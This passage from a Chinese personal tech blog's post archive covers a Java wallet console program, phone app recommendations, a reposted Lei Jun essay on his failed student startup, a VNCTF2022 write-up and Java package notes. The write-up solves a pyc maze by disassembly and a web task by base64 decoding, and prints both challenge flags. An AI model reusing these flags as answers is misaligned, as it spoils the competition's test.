&#125;</span><br><span class="line">    <span class="comment">/**完成零钱通明细*/</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">detail</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(detail);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**完成收益入账*/</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">income</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;收益入账金额：&quot;</span>);</span><br><span class="line">        money = scanner.nextDouble();</span><br><span class="line">        <span class="comment">/*找出不正确金额条件，然后给出提示，就直接return*/</span></span><br><span class="line">        <span class="keyword">if</span> (money &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;收益入账金额 需要 大于 0&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;<span class="comment">//退出方法不再执行后面的方法</span></span><br><span class="line">        &#125;</span><br><span class="line">        balance += money;</span><br><span class="line">        date = <span class="keyword">new</span> Date();</span><br><span class="line">        System.out.println(sdf.format(date));</span><br><span class="line">        <span class="comment">//拼接收益入账到 details</span></span><br><span class="line">        detail += <span class="string">&quot;\n收益入账\t&quot;</span> + money + <span class="string">&quot;\t&quot;</span> + sdf.format(date) + <span class="string">&quot;\t&quot;</span> + balance;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**完成消费*/</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">pay</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;消费金额:&quot;</span>);</span><br><span class="line">        money = scanner.nextDouble();</span><br><span class="line">        <span class="keyword">if</span> (money &lt;= <span class="number">0</span> || money &gt; balance) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;你的消费金额应该在 0~&quot;</span> + balance);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;消费说明:&quot;</span>);</span><br><span class="line">        note = scanner.next();</span><br><span class="line">        balance -= money;</span><br><span class="line">        detail += <span class="string">&quot;\n&quot;</span> + note + <span class="string">&quot;\t-&quot;</span> + money + <span class="string">&quot;\t&quot;</span> + sdf.format(date) + <span class="string">&quot;\t&quot;</span> + balance;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**完成退出*/</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">exit</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">/*用户输入4退出时，给出提示“你确定要退出吗？ y/n”,必须输入正确的y/n</span></span><br><span class="line"><span class="comment">         * 否则循环输入指令，直到输入y 或者 n</span></span><br><span class="line"><span class="comment">         * (1)先定义一个变量 choice，接受用户的输入</span></span><br><span class="line"><span class="comment">         * (2)使用 while + break，来处理接受到的输入</span></span><br><span class="line"><span class="comment">         * (3)退出 while后，再判断choice是y还是n ，就可以决定退出了 */</span></span><br><span class="line">        String choice = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">            <span class="comment">/*要求用户必须输入y/n，否则就一直循环*/</span></span><br><span class="line">            System.out.println(<span class="string">&quot;你确定要退出吗？ y/n&quot;</span>);</span><br><span class="line">            choice = scanner.next();</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">&quot;y&quot;</span>.equals(choice) || <span class="string">&quot;n&quot;</span>.equals(choice)) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/*当用户退出while,进行判断*/</span></span><br><span class="line">        <span class="keyword">if</span> (choice.equals(<span class="string">&quot;y&quot;</span>)) &#123;</span><br><span class="line">            loop = <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.thestar0.SmallChange.oop;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Description（描述）: 这里直接调用SmallChangeOOP对象，显示主菜单即可</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@DATe</span>&amp;TIME（创建时间）: 2022/3/2 - 23:50</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Project</span>_name（项目名）: opp2</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Package</span>_name（包名）: com.thestar0.SmallChange</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>（作者）: thestar</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span>（版本）: 1.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SmalllChangeSysAPP</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> SmallChangeSysOOP().mainMenu();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>手机优质app</title>
      <link href="//e563b268.html"/>
      <url>//e563b268.html</url>
      
        <content type="html"><![CDATA[<h2 id="滴答清单（番茄工作法）">滴答清单（番茄工作法）</h2><blockquote><p>一款功能十分优秀的清单和打卡软件，目前本人正在使用(克服拖延症神器)</p><p>可惜有的功能（月视图）要vip不过大部分功能都可以用</p></blockquote><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220124220721633.png" alt="image-20220124220721633"></p><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/61eeb1e82ab3f51d918c3ee1.jpg" alt=""></p><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220124221004818.png" alt="image-20220124221004818"></p><blockquote><p>功能非常的多，我认为最好的功能是可以和别人实时同步，你可以将你写的便签通过微信给别人，然后可以彼此鼓励打卡完成目标，建议学习一下番茄工作法，然后尝试起来，然后你就可以变的自律起来了，从此告别拖延症</p><p>这款软件我个人用起来还蛮不错，还有一款与之大同的软件叫番茄todo，不知道有没有电脑版。</p></blockquote><h2 id="分享几个小细节">分享几个小细节</h2><ol><li><p>敲代码总烦中英文字符报错，比如中文下的（）写进代码里面就会报错</p><p>这个设置方法非常简单，去windows设置里面语言里面下载美式英语</p></li></ol><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220124222304667.png" alt="image-20220124222304667"></p><blockquote><p>按下win + 空格就可以切换到美式键盘，就会发现你怎么也打不出中文符号了，敲代码快到飞起（微软软件架构师的小技巧）</p></blockquote><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220124222333816.png" alt="image-20220124222333816"></p><ol start="2"><li>搜狗输入法中文状态下按shift + 6可以快速打出“……”。再也不用一个个敲逗号了</li><li>windows电脑支持电脑还原点（在控制面板恢复里面）</li></ol><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220124222735942.png" alt="image-20220124222735942"></p><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220124222833329.png" alt="image-20220124222833329"></p><blockquote><p>可以自己设置一个还原点，万一哪天系统崩了，还可以保护一下文件</p></blockquote><ol start="4"><li>学生邮箱可以白嫖很多东西（随便列几个）</li></ol><ul><li>github pro版</li><li>微软onedrive 5t云空间</li><li>jebrain全家桶</li><li>……</li></ul><h2 id="手机优质app">手机优质app</h2><h3 id="简讯">简讯</h3><blockquote><p>总说周知，我们现在正在处于大数据时代，基本上97%的我们经常用的软件都会通过大数据分析我们喜欢什么，让我们一直馅在自己的舒适圈，比如购物软件某宝某东某多多，全推荐你想买的，某音推荐你全喜欢的，一下子进去了，可能出来后就是几个小时了（大数据突然发现提可恶的，无形之中浪费你的时间）</p></blockquote><blockquote><p>而这款软件随机推荐你10篇各个行业的文章（都是权威的看报或者网站的文章）</p><p>这款软件的理念是：有些事，知道精华和结论就够了</p></blockquote><h3 id="李跳跳和绿去广告"><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/61eebb262ab3f51d9195d3d1.jpg" alt="">李跳跳和绿去广告</h3><blockquote><p>手机跳广告神器（原理大概就是模拟手指）</p><p>这两款软件并不会排斥，都是无广告的（而且还有一些非常暖心的功能）</p></blockquote><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/61eebcf22ab3f51d9197b34b.jpg" alt="这个是李跳跳"></p><p><img src="https://pic.imgdb.cn/item/61eebd102ab3f51d9197d2ad.jpg" alt="这个是绿去广告"></p><p><img src="https://pic.imgdb.cn/item/61eebd9a2ab3f51d91985fdb.jpg" alt="这也是绿去广告一些实用"></p><p>播放器oplayer</p><blockquote><p>手机端播放视频神器，可以解析很多格式的视频</p></blockquote><p>一个木函</p><blockquote><p>工具箱，各种各样的工具</p></blockquote><p><img src="https://pic.imgdb.cn/item/61eebe252ab3f51d9198f827.jpg" alt=""></p><p>icreaven(手机最强游览器)</p><blockquote><p>手机游览器不能像电脑游览器安装插件让游览器开挂？</p><p>那只是你没发现icreaven（其实还有一款手机端的游览器叫via，之前用过内存不到1m的游览器，也可以开挂，不过相比这个还差远了）</p></blockquote><blockquote><p>这款软件用的火绒游览器整合过来的，用过火绒游览器的对这个应该会顺手，我用的chrome比较多，可惜手机端chrome不能开挂</p></blockquote><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/61eebf972ab3f51d919a9b69.jpg" alt="可以下载油猴插件继续开挂上挂，还有去广告的插件ublock"></p><p><img src="https://pic.imgdb.cn/item/61eebfe82ab3f51d919af4d8.jpg" alt="使用界面和电脑差不多"></p><p>国家哲学社会科学文献中心（国家软件）</p><blockquote><p>查论文的神器，国家直接出手打击知网偷别人论文赚钱（天下苦知网久已）</p></blockquote><p>canva可画/搞定设计</p><blockquote><p>这两款软件是设计者用的，做海报，公总号头像……很多模板和素材</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 软件 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软件 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>雷军的大学创业失败经历</title>
      <link href="//47ac6548.html"/>
      <url>//47ac6548.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>最近又非常迷茫，不知道干什么，于是乎看起了书，《硅谷之火》《一往无前》</p><p>下面为最近看见的雷总的大学创业失败经历，想起了硅谷之火里面的乔布斯</p><p>看完属于那个年代的故事，颇感亢奋</p></blockquote><h1>我惨痛的大学创业失败经历</h1><p>​                                                                                                                         --雷军</p><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/6207e6942ab3f51d91e81d5a.jpg" alt=""></p><p>不少人想白手起家、空手套狼，在今天的商业社会里这是非常不现实的一件事情。我特别想问：你为什么不能先做能力及资源上的积累后再创业呢？如果你觉得机会难得，为什么不去试图说服更多人给资源后再创业呢？</p><p>我参与创办过了金山软件、卓越网，作为天使投资人投资了不少成功的创业项目，看起来很拉风。但其实上我也有过非常惨痛的失败。创业不是件容易的事情，一定要想清楚，做好充分的准备后再出发。</p><p>有的人为了养家糊口被迫去创业，有的人为了面子和虚荣盲目去创业，这样的创业注定会很坎坷！</p><h1>惨痛的大学创业失败的经历</h1><p>XX年我上了武汉大学计算机系。武大是国内最早一批实施学分制的大学，只要修完一定的学分就可以毕业。刚上大学，我对自己要求比较严，就开始选修了不少高年级的课程。仅用了两年时间，我就修完了所有学分，甚至完成了大学的毕业设计。</p><p>虽是速成，我的成绩还是不错的。当年《pascal程序设计》课程的作业，老师觉得非常出色，选作了下一版教材的示范程序。据后来的师弟们说，我是系里二十年来拿过《汇编语言程序设计》满分成绩的仅有两个学生之一。那时，我酷爱写程序，已经在老师实验室泡了一年多，成了各个实验室的老油条。</p><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/v2-ba8b7c52721825874f5c8ccba150ac4f_1440w.jpg" alt=""></p><p>读完两年大学，我已经不满足于校园生活，准备闯荡江湖了。当年的游侠，必备如下的装备：一辆破自行车和一个破包，包里至少要装两盒磁盘及三本很厚的编程参考书。武大樱园宿舍到电子一条街，+距离并不远，但走路需要四五十分钟，自行车成了必须的装备，新自行车招贼，所以最好是辆破自行车。当年最好的电脑是286，内存也只有1m。对于一个高手来说，所有常用软件必须自备，至少需要20张软盘。编译工具里没有编程接口资料，也没有电子版的图书，只好常备几本很厚的编程资料。那时的书质量不高，内容也不全，还常常有很多错误，至少需要三本对照着看。背着三本很厚很沉的书跑来跑去，肯定不是一件舒服的事情。就是那个时候，我下定了决心，要写一本没有错误、内容全面的编程资料书，让所有程序员只带一本书就可以了。这本书就是我和同事年合著的《深入dos编程》。</p><p>就这样，我骑着破自行车，背着装满磁盘和参考书的大包，开始闯荡武汉电子一条街。</p><p>刚出道时，我的想法比较简单，只要能学东西，干什么都可以，赚不赚钱不重要。我对各种新生事物都抱着非常浓厚的兴趣。接下来的两年，涉猎之广，令我自己今天也很惊讶。我写过加密软件、杀毒软件、财务软件、cad软件、中文系统以及各种实用小工具等，和王全国一起还做过电路板设计、焊过电路板，甚至还干过一段黑客，解密各种各样的软件。两年混下来，各家电脑公司老板都成了熟人，他们有任何技术难题，都愿意找我帮忙。这样，我成了武汉电子一条街的名人。</p><h3 id="黄玫瑰小组">黄玫瑰小组</h3><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/images.jpg" alt=""></p><p>XX年5月，我在电子一条街上认识了王全国，他在一家校办的卖电脑的公司里负责技术支持。很快，这位比我高三级、年长四岁的留校老师成了我最好的朋友，我们的友谊一直延续到今天，现在他在金山，任副总裁兼cio。</p><p>当时他想做加密软件，正在做一个加密软件的界面，而我正好在写加密软件的内核。我们俩约定暑假合作写款加密软件。八月份正是开始，我们两个人大约用了两周时间，没日没夜的辛苦，完成了所有编码、测试、界面设计以及说明书等，这款加密软件就完成了。 当时正在放映电影《神秘的黄玫瑰》，王全国就建议以黄玫瑰小组来署名我们的作品。就这样，黄玫瑰小组诞生了。以后我们在自己的作品里面，经常用馈人玫瑰之手，历久犹有余香这句话作为标准签名档。</p><h3 id="反病毒专家">反病毒专家</h3><p>XX年底，计算机病毒刚刚在国内出现，就引起了我极大的兴趣。为了解决学校机房染毒的问题，我和同学冯志宏合作开发出了《免疫90》，这是我写的第二款商业软件。</p><p>回忆起当时的合作，冯志宏说：当时病毒流行来，就起了念头要做一个杀毒软件，两个人都有这个想法，就有合作啦。当时的条件并不好，我们在外面的一个公司找了一台机器上机，两个人分工合作开发程序，因为寒假自由时间比较充裕，就选择了在寒假进行开发。武汉的冬天特别冷，每天我们都从武大骑车到那 个公司去上机，风雪无阻，脚也生了冻疮，放假时食堂吃饭不方便，就经常自己动手煮波纹面，直到几年后雷军还在提冯志宏煮的波纹面很好吃。</p><p>免疫90是用pascal写的，最终的版本可以查、解当时发现的所有病毒。我现在还对这个程序记忆犹新：这个杀毒软件具备病毒免疫功能，如果染上病毒，该程序可以像抖落身上灰尘一样把病毒清除；还做到了样本库升级和在英文环境下英文显示，在中文环境下中文显示；用户甚至可以用文本方式手工增加病毒库。这些功能今天看来没有什么，但大家想想这是XX年底我们的作品。</p><p>XX年，随着防病毒市场逐步开始启动，公安部介入了反病毒软件的研发及产品管理。我没有正式从大学毕业，觉得写杀毒软件麻烦太多了，就暂停了免疫90的后续研发。</p><h3 id="开放源代码">开放源代码</h3><p>我还与冯志宏合作开发过一个共享软件ri。 当时ri很流行。之所以能够流行，是因为当时电脑的内存很小，在运行程序多了之后会导致系统速度变得很慢，而有些软件则可能因为内存被其他资源占用而无法运行，这时候就需要重启电脑。ri执行以后驻留内存，然后随时可以通过可自定义的热键来清除当前的环境或正在执行中的程序，回到驻留ri时的dos提示符状态下。为了让更多的用户免收频繁重启的痛苦，我决定把这款工具软件完全免费。</p><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/images%20(2).jpg" alt=""></p><p>这个产品对于程序员调试程序非常方便。开发软件的过程中，总存在很多死机的bug,需要频繁重启电脑。使用ri可以提高程序员的效率。很快，ri在当时程序员也几乎是人手一份的必备工具。</p><p>年底，我花了整整三天时间重写了ri，新版的ri2.0功能更为强劲。为了让更多的程序员来帮我修改完善，我公布了所有的源代码。 看来ri也算国内最早一批开放源代码的免费软件了。</p><h3 id="黑客生涯">黑客生涯</h3><p>年初，我在一个朋友那用了wps汉卡，当时就被震住了。界面易用美观，更强的是打印结果可以先模拟显示出来。署名是香港金山公司求伯君，觉得这个香港软件写得真好。由于当时的电脑存贮和运算能力不足，wps软件需要一块价值不菲的汉卡支持。我特别想买套来用用，但买一套需要2000多元，这在当时是一个天文数字。没有办法，我决定把wps解密，并移植到普通电脑上直接使用。</p><p>这可不是件容易的事情，我几乎有两周没怎么睡觉，终于完成了。在使用过程中，我又在原来的基础上做了一些增强和完善，不少朋友觉得很好用。于是，我解密的wps版本成了国内最流行的wps版本了。因为这个渊源，我后来认识了求伯君。<br>我在图书馆看了一本《硅谷之火》，深深被乔布斯的故事吸引。八十年代是乔布斯的年代，他是全世界的it英雄，当年的影响力绝不亚于今天。九十年代初，连盖茨都说，他只不过是乔布斯第二而已。在电子一条街打拼一段时间后，自我感觉良好，就开始做梦：梦想写一套软件运行在全世界每台电脑上，梦想办一家全世界最牛的软件公司。于是，下面的故事就是这样开始了。</p><p>那是年七八月，大三暑假。王全国有个同事，和他的一个朋友想办家公司，拉我和王全国入伙。他们俩人负责市场销售，我和王全国负责技术和服务，股份四个人平分。我和王全国对自己的技术相当自信，他们俩也对自己的销售能力非常自信，好象天作之合，我们几乎没有犹豫就答应了。我当时想，乔布斯、盖茨、戴尔就是大学创业成功的，我为什么不可以？想到这些，顿时热血沸腾，脑子晕晕的。今天回想起来觉得好奇怪，我们好象根本就没有讨论过，开公司谁投钱，开张后做什么，靠什么赚钱等等实际问题。真的是人有多大胆，地有多大产。</p><p>公司取名为三色sunsir，我们希望红黄蓝三原色创造七彩的新世界，放飞我们创业的梦想。我们四个人都没有什么钱，也没有找人投资，最后还是我帮公司拿了第一张单子赚了几千元，才开始启动了。</p><p>刚开始，租用了珞瑜饭店103房间作为办公室。我们什么赚钱就做什么，没什么套路。每天忙得热火朝天，白天跑市场销售，晚上回来做开发。后来找了一个方向，做仿制汉卡。办公室十几平方米，放了桌子和电脑，就没什么地方。我们晚上基本不回宿舍，睡觉的时候五六个人就直接躺在办公室里。实在找不到地方躺的人，就只能坐在电脑前干活了。不久，李儒雄加入了我们的团队。他也是一个很能干的人，后来他参与创办了连邦软件，曾任连邦软件总裁。</p><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/images%20(1).jpg" alt=""></p><p>没过多久，我们仿制汉卡的技术就被人盗用了，他们一次做的量比我们大，卖的价钱也比我们便宜，这个产品几乎没挣到什么钱。</p><p>看起来我们的团队也很强大，公司人最多的时候有十四个人，业务范畴也挺宽的，卖过电脑，做过仿制汉卡，甚至接过打字印刷的活。实际上，帐上基本没什么钱，连吃饭都是个问题。有个兄弟吹牛说他麻将打得好，自告奋勇去和食堂师傅打麻将，真的赢了一大堆饭菜票。后来实在没钱的时候，我们就派他去打麻将赢饭菜票。我们就是这样过日子的。</p><p>还有件很烦心的事，就是四个股份相同的股东，谁做董事长，谁说了算。我当年二十岁刚出头，不想掺和这样的事情，但他们好几次把我从武大的教室里面叫出来开会，一开就是一通宵。短短几个月时间，董事长改选了两次。和所有创业公司一样，中间还发生过好多好多事。</p><p>高涨的创业热情被残酷的现实一天一天消磨，我开始思考一个问题：作为一个大四的学生，我是否具备创业所需要的能力？琢磨了好几个晚上，我提出了散伙。</p><p>那是冬天的一个星期天，大家同意了我和王全国退出，我们分了一台286、一台打印机和一堆芯片，就离开了。虽然我们一起创业只有半年多时间，回想起来过去的事情历历在目，觉得有一个世纪那么漫长。<br>经过了创业的煎熬，回到学校，心里轻松极了，一个人走在武大的樱花路上，觉得阳光灿烂。</p><p>我的大学创业过程就这样惨淡收场了。</p><p>我觉得，人就是在挫折和失败中成长的。正因为这次失败，我对自己的能力有了清醒的认识，也为未来的发展做好了脚踏实地、一步一步干的心理准备。</p><p>大学四年很快就过去了。</p><p>我不顾一切来到了中国it的中心北京，闯荡京城的故事就这样开始了</p>]]></content>
      
      
      <categories>
          
          <category> 杂记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 故事 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VNCTF2022公开赛wp</title>
      <link href="//5638e77f.html"/>
      <url>//5638e77f.html</url>
      
        <content type="html"><![CDATA[<h1>Reverse</h1><h2 id="1-Babymaze">1. Babymaze</h2><p>顾名思义，迷宫题</p><p>下载文件后发现是一个pyc文件</p><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220217173437926.png" alt="image-20220217173437926"></p><p>找了个在线反编译文件反编译try了一下</p><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220217173622838.png" alt="image-20220217173622838"></p><p>空白，应该是混淆吧，只能撸字节码了</p><p>在撸字节码文件之前我尝试了winhex看了一些信息</p><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220217173827087.png" alt="image-20220217173827087"></p><p>在这里发现一个重要的信息就是跑出来的迷宫需要md5一下</p><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220217173833369.png" alt="image-20220217173833369"></p><p>撸的一个脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> dis, marshal, sys</span><br><span class="line"></span><br><span class="line">header_sizes = [</span><br><span class="line">    (<span class="number">8</span>,  (<span class="number">0</span>, <span class="number">9</span>, <span class="number">2</span>)),  </span><br><span class="line">    (<span class="number">12</span>, (<span class="number">3</span>, <span class="number">6</span>)),     </span><br><span class="line">    (<span class="number">16</span>, (<span class="number">3</span>, <span class="number">7</span>)),    </span><br><span class="line">]</span><br><span class="line">header_size = <span class="built_in">next</span>(s <span class="keyword">for</span> s, v <span class="keyword">in</span> <span class="built_in">reversed</span>(header_sizes) <span class="keyword">if</span> sys.version_info &gt;= v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;BabyMaze.pyc&#x27;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    metadata = f.read(header_size) </span><br><span class="line">    code = marshal.load(f)</span><br><span class="line"></span><br><span class="line">dis.dis(code)</span><br></pre></td></tr></table></figure><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220217174014351.png" alt="image-20220217174014351"></p><p>起点（1.1）</p><p>终点（29.29）</p><p>不多说</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&#xx27;</span></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">pic = Image.new(<span class="string">&#x27;RGB&#x27;</span>,(<span class="number">31</span>,<span class="number">31</span>),(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">31</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">31</span>):</span><br><span class="line">        <span class="keyword">if</span>(s[i*<span class="number">31</span>+j] == <span class="string">&#x27;0&#x27;</span>):</span><br><span class="line">            pic.putpixel((j,i),(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">        <span class="keyword">elif</span>(s[i*<span class="number">31</span>+j] == <span class="string">&#x27;1&#x27;</span>):</span><br><span class="line">            pic.putpixel((j,i),(<span class="number">255</span>,<span class="number">255</span>,<span class="number">0</span>))</span><br><span class="line">        <span class="keyword">elif</span>(s[i*<span class="number">31</span>+j] == <span class="string">&#x27;3&#x27;</span>):</span><br><span class="line">            pic.putpixel((j,i),(<span class="number">255</span>,<span class="number">0</span>,<span class="number">255</span>))</span><br><span class="line">pic.show()</span><br><span class="line">pic.save(<span class="string">&#x27;flag.png&#x27;</span>)</span><br></pre></td></tr></table></figure><p>将跑出来的数据画个图可视化一下</p><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220217174154450.png" alt="image-20220217174154450"></p><p>就是这个图</p><p>然后撸出来md5后</p><p>==flag:VNCTF{801f190737434100e7d2790bd5b0732e}==</p><h1>web</h1><h2 id="1-GameV4-0">1.GameV4.0</h2><p>不会做web，不过看到500多人做出来了，还是决定去摸索一番</p><p>题目顾名思义是一款网络在线游戏，进去摸索了一番，有个关卡是flag</p><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220217174631714.png" alt="image-20220217174631714"></p><p>进去又摸索了一番，自己搭建博客的经历认识了静态css和js渲染</p><p>f12翻了一手</p><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220217174707049.png" alt="image-20220217174707049"></p><p>老宝贝base64</p><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220217175117603.png" alt="image-20220217175117603"></p><p>==flag: VNCTF{Welcome_to_VNCTF2022}==</p>]]></content>
      
      
      <categories>
          
          <category> 比赛wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java面向对象（中级）</title>
      <link href="//74e9e141.html"/>
      <url>//74e9e141.html</url>
      
        <content type="html"><![CDATA[<h1>包</h1><h2 id="包的三大作用">包的三大作用</h2><ol><li>区别相同名字的类</li><li>当类很多时，可以很好的管理类</li><li>控制访问范围</li></ol><h2 id="包的基本语法">包的基本语法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> 关键字 表示打包</span><br><span class="line">com.thestar0 表示包名</span><br></pre></td></tr></table></figure><h2 id="包的本质（原理）">包的本质（原理）</h2><blockquote><p>包的本质 实际上就是创建不同的文件夹/目录来保存类文件</p></blockquote><h2 id="包的命名">包的命名</h2><blockquote><p>只能包含数字，字母，下划线，小圆点，但不能用数字开头 ，不能是关键字或保留字</p></blockquote><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220201192033741.png" alt=""></p><h2 id="常用的包">常用的包</h2><p>java中常用的包</p><ol><li>java.lang.* //lang是基本包，默认引入，不需要再引入.不如String,math等具体参考jdk文档</li><li>java.util.* //util包，是jdk提供的工具包，工具类，比如扫描器Scanner</li><li><a href="http://java.net">java.net</a>.* //net包，网络包，网络开发</li><li>java.awt.* //awt包，是做java页面开发,GUI</li></ol><h2 id="如何引用包">如何引用包</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">语法： <span class="keyword">import</span> + 包名；</span><br><span class="line">我们引入包的目的是使用包下面的类</span><br><span class="line">eg: <span class="keyword">import</span> java.util.Scannner;就是引入util包下的Scanner类</span><br><span class="line"><span class="keyword">import</span> java.util.*;<span class="comment">//表示将util下面所有的包都引入</span></span><br><span class="line">建议不要选者全部引入模式</span><br></pre></td></tr></table></figure><p>使用系统提供 Arrays 完成 数组排序</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.thestar0;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span 